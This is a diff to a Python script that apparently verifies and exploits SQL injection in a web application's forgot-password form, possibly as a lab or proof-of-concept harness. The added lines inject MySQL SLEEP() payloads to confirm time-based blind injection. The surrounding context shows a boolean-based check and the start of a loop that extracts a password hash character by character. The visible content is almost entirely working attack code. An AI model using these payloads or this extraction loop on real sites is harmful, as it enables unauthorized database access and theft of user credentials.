@@ -96,6 +96,17 @@ assert predicate("1=1")
 assert not predicate("1=2")
 print("PASS: true/false boolean SQL condition changes the application response", flush=True)
 
+# Time-based blind SQLi is a separate assertion, not inferred from the boolean
+# response test. The true predicate must cause a real MySQL SLEEP() delay.
+start = time.monotonic()
+post_forgot(email + "' AND IF(1=1,SLEEP(1),0)-- -", csrf)
+true_delay = time.monotonic() - start
+start = time.monotonic()
+post_forgot(email + "' AND IF(1=2,SLEEP(1),0)-- -", csrf)
+false_delay = time.monotonic() - start
+assert true_delay - false_delay >= 0.8, (true_delay, false_delay)
+print("PASS: genuine MySQL time-based blind condition produces a measurable SLEEP delay", flush=True)
+
 hash_chars = []
 for position in range(1, 61):
     low, high = 32, 126
